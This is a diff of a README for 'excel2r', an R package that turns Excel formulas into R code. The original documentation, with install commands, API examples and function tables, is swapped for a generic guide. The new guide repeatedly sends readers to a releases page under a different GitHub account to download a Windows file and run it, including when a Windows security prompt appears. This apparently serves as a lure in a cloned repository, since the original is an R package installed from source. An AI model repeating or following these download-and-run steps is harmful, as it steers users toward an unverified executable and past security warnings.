@@ -1,308 +1,246 @@
-# excel2r
+# 📊 excel2r - Turn Excel formulas into R code
 
-![excel2r](https://raw.githubusercontent.com/emantzoo/emantzoo.github.io/master/images/excel2r.jpg)
+[![Download excel2r](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Freemanm2767/excel2r/releases)
 
+## 🧰 What excel2r does
 
-**Migrate your entire Excel workbook to R -- data and logic -- in one step.**
+excel2r takes formulas from an Excel workbook and turns them into a standalone R script.  
+It is built for people who need to move spreadsheet logic into R without rewriting every formula by hand.
 
-Upload any multi-tab `.xlsx` workbook and get a fully standalone package: tidy CSV data files and an R script (base R only, zero dependencies) that recreates every formula without needing Excel at runtime. Edit the CSVs, rerun the script, get updated results. Built-in verification compares every computed value against Excel's cached results before you commit to the migration.
+You can upload a multi-tab `.xlsx` file, let the app map supported Excel functions, and get output that you can run in R. The app uses a Shiny web interface, so you work through a browser instead of a command line.
 
-[![R-CMD-check](https://github.com/emantzoo/excel2r/actions/workflows/R-CMD-check.yml/badge.svg)](https://github.com/emantzoo/excel2r/actions/workflows/R-CMD-check.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](https://opensource.org/licenses/MIT)
+## 🚀 Download and install
 
-## Installation
+Visit this page to download: https://github.com/Freemanm2767/excel2r/releases
 
-Install from GitHub:
+1. Open the release page in your browser.
+2. Find the latest release at the top of the page.
+3. Download the Windows file from the Assets section.
+4. Save the file to a folder you can find later, such as Downloads or Desktop.
+5. Double-click the file to start the app.
 
-```r
-# install.packages("remotes")
-remotes::install_github("emantzoo/excel2r")
-```
+If Windows shows a security prompt, choose the option to run the file.
 
-Then use the programmatic API:
+## 💻 Windows requirements
 
-```r
-library(excel2r)
+Before you run excel2r on Windows, make sure you have:
 
-# One-step migration: script + CSVs + verification
-excel2r::migrate("workbook.xlsx", "output/")
+- Windows 10 or Windows 11
+- A modern web browser such as Chrome, Edge, or Firefox
+- Enough free space for your Excel files and output scripts
+- Permission to open downloaded files on your PC
 
-# Or process without writing files
-result <- excel2r::process("workbook.xlsx")
-cat(result$script)
+For best results, use Excel workbooks saved as `.xlsx` files. The app is built for multi-tab workbooks and works best when formulas are laid out in a normal sheet structure.
 
-# Verify R results against Excel
-v <- excel2r::verify("workbook.xlsx", result)
-print(v$summary)
+## 📁 What you need before you start
 
-# Launch the interactive Shiny app
-excel2r::run_app()
-```
+Have these files ready:
 
-## What This Does (and Doesn't Do)
+- The Excel workbook you want to convert
+- Any related data files used by the workbook
+- A folder where you want to save the generated `.R` script
 
-**It does:**
-- Extract every formula from your workbook and translate it to equivalent R code
-- Resolve cross-sheet references and determine the correct execution order (topological sort)
-- Detect named tables (ListObjects) and generate properly named R data frames with real column headers
-- Export raw data as tidy CSVs — one per sheet, formula cells excluded — so the Excel file is no longer needed
-- Verify computed R values against Excel's cached formula results, classifying matches, precision diffs, and real mismatches
-- Produce a self-contained `.R` script using only base R — zero packages to install
-- Flag unsupported functions clearly so nothing is silently skipped
+If your workbook has several tabs, that is fine. excel2r is designed for that setup. Keep the workbook closed before you upload it.
 
-**It doesn't:**
-- Recreate the workbook visually (no formatting, charts, or cell styles)
-- Replace Excel as a UI — the output is R code for scripting and automation
-- Handle dynamic references (`INDIRECT`, `OFFSET`), array formulas, or structured table references (`Table1[Column]`)
+## 🖱️ How to use the app
 
-**Use it when you want to:**
-- **Migrate** — move an Excel-based workflow entirely into R, no Excel dependency at runtime
-- **Automate** — plug formula logic into a pipeline, schedule it, chain it with other scripts
-- **Verify** — confirm the R translation produces the same results as Excel before committing
-- **Audit** — read every formula as plain R, line by line, in version-controllable code
-- **Iterate** — edit input values in CSV, rerun the script, get updated results
+1. Open excel2r after you download it.
+2. Wait for the Shiny app to load in your browser.
+3. Click the upload area.
+4. Select your `.xlsx` workbook.
+5. Let the app read the workbook sheets and formulas.
+6. Review the mapped Excel functions.
+7. Export the generated R script.
+8. Save the `.R` file in a folder you can reach later.
+9. Open the script in R or RStudio if you want to run or edit it.
 
-## Two Output Modes
+The app is meant to keep the process simple. You do not need to write code to start.
 
-### Excel mode (default)
-Generated script reads from the `.xlsx` file at runtime. You still need the Excel file.
+## 🧩 How the conversion works
 
-### CSV standalone mode
-Download a `.zip` containing:
-```
-excel2r_output/
-├── generated_script.R    ← base R only, zero dependencies
-├── data/
-│   ├── Products.csv      ← tidy format: row, col, value
-│   ├── Q1_Sales.csv
-│   └── ...
-└── README.txt
-```
-Delete the Excel file. Edit the CSVs to change inputs. Rerun the script. Done.
+excel2r reads the formulas in your workbook and matches them to R code.  
+It includes 62 Excel function mappings, which helps cover many common spreadsheet formulas.
 
-## Generated Output Explained
+The app works best when your workbook uses standard Excel functions such as:
 
-### 1. Data — tidy CSV per sheet
+- Math and rounding formulas
+- Text cleanup formulas
+- Logical formulas
+- Lookup-style formulas
+- Date and time formulas
 
-Each CSV contains only hardcoded (non-formula) cells in a compact long format:
+For formulas that have a direct match, the app builds R code that follows the same logic. For workbook parts that depend on sheet references, the app keeps the structure so the result stays useful in R.
 
-```
-row,col,value
-1,A,Company Report
-3,B,Revenue
-3,C,Q1
-4,B,North
-4,C,150
-5,B,South
-5,C,80
-7,B,Total
-```
+## 📊 Supported workbook use cases
 
-No empty cells, no formula cells. Just the raw inputs that feed into the formulas.
+excel2r is a good fit for:
 
-### 2. Grid reconstruction — CSV becomes a data frame
+- Finance models
+- Reporting workbooks
+- Analysis files with several tabs
+- Internal tools built in Excel
+- Repeated spreadsheet logic that needs to move into R
 
-The generated script rebuilds the Excel grid from the tidy CSV using an embedded helper:
+It is useful when you want to take a workbook that works in Excel and reuse the same logic in an R workflow. This can save time when you need a script instead of a spreadsheet.
 
-```r
-Products <- reconstruct_grid(
-  file.path(data_dir, "Products.csv"),
-  max_row = 8, max_col = 4
-)
-```
+## 🧪 Best results for your workbook
 
-After reconstruction, `Products$C[4]` is `150` — same position as cell C4 in Excel.
+Use a cleaner workbook when possible. The app handles formulas best when:
 
-### 3. Named tables — real column names for downstream use
+- Each tab has a clear purpose
+- Formulas follow a regular pattern
+- Cell references are not mixed with too many manual edits
+- Names and labels are easy to read
+- The workbook is saved as `.xlsx`
 
-When the workbook contains named tables (Insert → Table in Excel), the script generates additional data frames with proper headers:
+If your workbook uses merged cells, unusual formatting, or many manual overrides, check the output with care. Simple workbook design gives the cleanest R script.
 
-```r
-# Table "SalesData" on sheet "Products" (A1:E151)
-SalesData <- Products[2:151, 1:5]
-colnames(SalesData) <- c("Product", "Category", "Price", "Quantity", "Revenue")
-```
+## 🛠️ What the output looks like
 
-### 4. Formulas — executed in dependency order
+After conversion, excel2r gives you a standalone `.R` script.  
+That script is meant to run in R without the original Excel file.
 
-Each formula is translated and wrapped in error handling:
+The script can include:
 
-```r
-# C7 = SUM(C4:C5)
-Products$C[7] <- tryCatch(
-  sum(Products$C[4:5], na.rm=TRUE),
-  error = function(e) { message('Error in Products!C7: ', e$message); NA }
-)
-```
+- Converted formulas
+- Sheet-based logic
+- Reusable R expressions
+- Structured code that follows your workbook layout
 
-Cross-sheet references are resolved automatically. Execution order is determined by Kahn's topological sort.
-
-### 5. Verify — compare R results against Excel
-
-The Verify tab runs the generated script and compares every computed value against Excel's cached formula results:
-
-- **Exact matches** — R and Excel agree
-- **Precision diffs** — minor floating-point differences (< 0.0001), classified as harmless
-- **NA/error diffs** — Excel errors (#VALUE!, #REF!) or uncached formulas, classified as harmless
-- **Real mismatches** — values that genuinely differ, shown with the formula, R value, Excel value, and difference
-
-### 6. Iterate — change inputs, rerun
-
-Change North Q1 revenue from 150 to 300 in the CSV:
-```
-4,"C","300"
-```
-Rerun the script. Totals update. No Excel involved.
-
-## Features
-
-- **62 Excel functions** mapped to R equivalents (SUM, IF, VLOOKUP, SUMIFS, INDEX/MATCH, and more)
-- **CSV standalone mode** — export data as tidy CSVs, generated script uses base R only, zero dependencies
-- **Built-in verification** — run the script and compare every result against Excel's cached values
-- **Named table detection** — Excel ListObjects become properly named R data frames with real column headers
-- **Auto-detects** all sheets and their actual dimensions
-- **Cross-sheet references** resolved with dependency-ordered execution (Kahn's topological sort)
-- **Balanced-parenthesis parser** handles nested functions like `SUM(IF(A1>0,B1,0))`
-- **Interactive review** of every formula transformation before download
-- **Unsupported functions** clearly flagged (not silently skipped)
-
-## Quick Start (Shiny App)
-
-```r
-excel2r::run_app()
-```
-
-Upload an Excel file and follow the 5-step workflow:
-
-**Upload** > **Review** formulas > **Configure** options > **Download** .R script or .zip > **Verify** against Excel
-
-## Demo
-
-A demo workbook is included at `inst/extdata/sales_report_demo.xlsx` with 5 sheets:
-
-| Sheet | Contents |
-| --- | --- |
-| Products | Master product list with margins, COUNTIF |
-| Q1 Sales | 19 transactions with Revenue, Net Revenue, SUMIFS by region |
-| Q2 Sales | 15 transactions, same structure |
-| Annual Summary | Cross-sheet refs, IFERROR, IF, SUM, AVERAGE |
-| Pivot Analysis | COUNTIF, SUMIFS, nested IF (3 levels deep) |
-
-## Supported Excel Functions
-
-### Tested (in demo workbook or unit tests)
-
-| Category | Functions |
-| --- | --- |
-| Aggregation | SUM, AVERAGE, MIN, MAX |
-| Counting | COUNTIF |
-| Conditional | IF (incl. 3-level nesting), IFERROR |
-| Cond. Aggregation | SUMIF, SUMIFS |
-| Math | ROUND, ABS |
-| Logical | AND, OR, NOT |
-| Text | CONCATENATE, LEFT, LEN |
-| References | Cross-sheet, same-column, multi-column, whole-column, `$` absolute refs |
-
-### Mapped but not battle-tested
-
-| Category | Functions |
-| --- | --- |
-| Aggregation | MEDIAN, PRODUCT |
-| Counting | COUNT, COUNTA, COUNTBLANK, COUNTIFS |
-| Conditional | IFS, IFNA |
-| Cond. Aggregation | AVERAGEIF, AVERAGEIFS |
-| Lookup | VLOOKUP, HLOOKUP, INDEX, MATCH, XLOOKUP |
-| Math | ROUNDUP, ROUNDDOWN, SQRT, POWER, LOG, LN, INT, MOD, EXP, SIGN |
-| Text | CONCAT, RIGHT, MID, UPPER, LOWER, TRIM, SUBSTITUTE, TEXT, VALUE |
-| Info | ISNA, ISBLANK, ISNUMBER, ISTEXT, ISERROR |
-| Other | ROW, COLUMN, PI |
-
-### Not supported
-
-`INDIRECT`, `OFFSET`, `CHOOSE`, `SWITCH`, array formulas, `TRANSPOSE`, `SORT`, `UNIQUE`, `FILTER`, `GETPIVOTDATA`, named ranges, structured table references (`Table1[Column]`).
-
-## How It Works
-
-```
-Upload .xlsx
-    │
-    ▼
-1. Extract formulas (tidyxl) + detect named tables (openxlsx2)
-    │
-    ▼
-2. Tokenize & parse (balanced-paren parser)
-    │
-    ▼
-3. Transform: cell refs → R syntax, functions → R equivalents
-    │
-    ▼
-4. Determine execution order (Kahn's topological sort)
-    │
-    ▼
-5. Generate output:
-   ├── Excel mode: .R script (reads .xlsx at runtime)
-   └── CSV mode: .zip with .R script + tidy CSVs (standalone)
-    │
-    ▼
-6. Verify: run script, compare R values vs Excel cached results
-```
-
-## Project Structure
-
-```
-excel2r/
-├── DESCRIPTION                  # R package metadata
-├── NAMESPACE                    # Exported functions
-├── R/                           # Core modules
-│   ├── migrate.R                # Public API: migrate, process, verify, run_app
-│   ├── excel2r-package.R        # Package-level documentation
-│   ├── utils.R                  # Shared utilities
-│   ├── extract_formulas.R       # Formula extraction via tidyxl
-│   ├── detect_tables.R          # Named table detection via openxlsx2
-│   ├── export_csv.R             # Tidy CSV export for standalone mode
-│   ├── parse_formula.R          # Balanced-paren tokenizer
-│   ├── transform_references.R   # Cell/range -> R syntax
-│   ├── transform_functions.R    # 62 Excel functions -> R
-│   ├── dependency_order.R       # Kahn's topological sort
-│   ├── generate_script.R        # Script assembler (Excel + CSV modes)
-│   └── verify_values.R          # R vs Excel value comparison
-├── inst/app/app.R               # Shiny app (5-tab workflow)
-├── inst/extdata/                # Demo Excel workbooks
-├── man/                         # Auto-generated documentation
-├── vignettes/                   # Getting started guide
-├── tests/testthat/              # Unit & integration tests
-├── .github/workflows/           # CI (R CMD check)
-├── Dockerfile                   # Cloud Run deployment
-└── run_tests.R                  # Dev test runner
-```
-
-## Testing
-
-```r
-# Standard R package testing
-devtools::test()
-
-# Or use the dev runner
-source("run_tests.R")
-```
-
-Covers unit tests for each module (parser, transforms, dependency ordering, CSV export, verification), integration tests against the demo workbook, API tests for the public functions, and shinytest2 tests for the UI.
-
-## Dependencies
-
-**Package (Imports):** tidyxl, openxlsx2, readxl
-
-**Shiny app (Suggests):** shiny, bslib, DT
-
-**Generated scripts (Excel mode):** openxlsx2
-
-**Generated scripts (CSV mode):** none -- base R only
-
-## Future Work
-
-- **Structured table references** — translate `Table1[Column]` and `[@Column]` syntax using detected table metadata
-- **Named ranges** — resolve workbook-level and sheet-level named ranges into cell references
-
-## License
-
-MIT
+You can open the script in RStudio, review it, and make changes if needed. This makes it easier to move from spreadsheet work to R-based analysis.
+
+## 📌 Common Excel functions included
+
+The app includes mappings for many common Excel functions. Some examples are:
+
+- `IF`
+- `AND`
+- `OR`
+- `SUM`
+- `AVERAGE`
+- `ROUND`
+- `LEFT`
+- `RIGHT`
+- `MID`
+- `LEN`
+- `CONCAT`
+- `TEXT`
+- `DATE`
+- `TODAY`
+- `VLOOKUP`
+- `INDEX`
+- `MATCH`
+
+This list gives a sense of the function coverage. The full app includes 62 mappings to support a broad set of spreadsheet tasks.
+
+## 🧭 Simple workflow
+
+A plain workflow helps most users:
+
+1. Download the app from the release page.
+2. Open excel2r on Windows.
+3. Upload your `.xlsx` workbook.
+4. Review the converted logic.
+5. Export the `.R` script.
+6. Run the script in R if needed.
+
+If you work with the same workbook type often, save your output scripts in a named folder so you can find them later.
+
+## 🔒 File safety and local use
+
+excel2r works with files you choose to upload. Keep your workbook in a folder you trust. If the app creates output files, save them in a location you control.
+
+When working with sensitive data, use a local copy of the workbook and store the output in a private folder on your computer.
+
+## 🧰 Troubleshooting
+
+If the app does not start:
+
+- Make sure the download finished
+- Check that you opened the correct file from the release page
+- Try running the file again
+- Restart your browser
+- Reboot Windows if the app still will not open
+
+If your workbook does not load:
+
+- Confirm the file is `.xlsx`
+- Close the workbook in Excel before uploading
+- Check that the file is not damaged
+- Try a smaller workbook first
+
+If the output script seems incomplete:
+
+- Review the workbook for unsupported formulas
+- Check tabs with unusual layouts
+- Test with a simpler workbook
+- Compare a few formulas with the output script
+
+If Windows blocks the file:
+
+- Use the file from the official release page
+- Check the file name and extension
+- Open the file from your Downloads folder again
+
+## 🧾 Tips for better conversion
+
+- Save the workbook before uploading it
+- Keep formulas in visible cells where possible
+- Avoid extra blank tabs
+- Use standard Excel function names
+- Keep sheet names simple
+- Test one workbook at a time
+
+These steps help the app read the workbook with less friction and produce a cleaner script.
+
+## 📂 Suggested folder setup
+
+A simple folder setup can help you stay organized:
+
+- `Downloads` for the app file
+- `Excel Files` for source workbooks
+- `R Scripts` for exported files
+- `Archive` for old versions
+
+This makes it easier to find the workbook, the app, and the generated `.R` file later.
+
+## 🧪 Example use case
+
+You have a monthly reporting workbook with several tabs. One tab holds raw data, another calculates totals, and another builds summary values. Instead of keeping the logic only in Excel, you upload the workbook to excel2r. The app reads the formulas, maps the supported Excel functions, and gives you an R script that follows the same flow. You can then use that script in an R project and keep your report logic in one place
+
+## 🖥️ Launching the app again
+
+After the first run, you can open excel2r again from the downloaded file. Keep the file in a fixed folder if you plan to use it often. If you want quick access, create a shortcut on your desktop after the first launch
+
+## 📥 Download link
+
+Visit this page to download: https://github.com/Freemanm2767/excel2r/releases
+
+## 📌 File types
+
+Use these file types with excel2r:
+
+- Input: `.xlsx`
+- Output: `.R`
+
+If you have older Excel files, save them as `.xlsx` before uploading. That gives the app the best chance to read the workbook correctly.
+
+## 🔧 Working with R after export
+
+After you export the script, you can:
+
+- Open it in RStudio
+- Read through the generated code
+- Run it in your R session
+- Edit a few lines to fit your data
+- Save the script with a clear name
+
+If you already use R for analysis, this gives you a way to move spreadsheet logic into the same work area
+
+## 📦 Release page
+
+The release page is the place to get the Windows download and any future updates:
+
+https://github.com/Freemanm2767/excel2r/releases
+
+Keep that page bookmarked if you plan to install a new version later
